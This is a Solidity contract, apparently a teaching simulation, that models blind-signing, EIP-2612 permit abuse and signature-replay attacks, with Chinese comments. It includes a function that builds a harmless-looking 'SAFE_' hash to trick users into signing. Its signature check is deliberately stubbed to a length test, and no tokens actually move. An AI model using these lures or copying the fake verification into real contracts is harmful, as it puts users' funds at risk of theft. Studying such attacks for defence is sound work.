// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title BlindSignAttack
 * @notice 盲签与离线签名攻击
 * @dev 利用用户不检查签名内容，签署恶意交易
 */
contract BlindSignAttack {
    address public attacker;

    struct SignedOrder {
        address token;
        address spender;
        uint256 amount;
        uint256 nonce;
        uint256 deadline;
        bytes signature;
    }

    mapping(address => uint256) public nonces;
    mapping(bytes32 => bool) public executedOrders;

    event OrderExecuted(address indexed user, address token, uint256 amount);
    event SignatureReplay(bytes32 indexed hash);

    constructor() {
        attacker = msg.sender;
    }

    /**
     * @notice 执行盲签订单（模拟EIP-2612 permit攻击）
     * @param order 签名订单
     * @param user 签名用户
     */
    function executePermitAttack(SignedOrder calldata order, address user) external {
        require(msg.sender == attacker, "Not attacker");

        bytes32 orderHash = keccak256(abi.encode(order));
        require(!executedOrders[orderHash], "Already executed");

        // 验证签名（简化版，实际需ecrecover）
        require(_verifySignature(orderHash, order.signature, user), "Invalid signature");

        executedOrders[orderHash] = true;
        nonces[user]++;

        emit OrderExecuted(user, order.token, order.amount);
    }

    /**
     * @notice 签名重放攻击：同一签名多次使用
     * @param orderHash 订单哈希
     * @param signature 签名
     * @param user 用户地址
     */
    function replayAttack(bytes32 orderHash, bytes calldata signature, address user) external {
        require(msg.sender == attacker, "Not attacker");

        // 在某些实现不佳的合约中，同一签名可被多次使用
        if (!executedOrders[orderHash]) {
            executedOrders[orderHash] = true;
        }

        emit SignatureReplay(orderHash);
    }

    /**
     * @notice 诱导签名：构造看似无害的哈希
     * @param fakeHash 伪造的"安全"哈希
     */
    function induceSigning(bytes32 fakeHash) external pure returns (bytes32) {
        // 返回一个看似无害的哈希，诱导用户签名
        // 实际可能与恶意操作关联
        return keccak256(abi.encodePacked("SAFE_", fakeHash));
    }

    function _verifySignature(bytes32 hash, bytes memory sig, address signer) internal pure returns (bool) {
        // 简化验证，实际应使用ecrecover
        return sig.length == 65;
    }
}
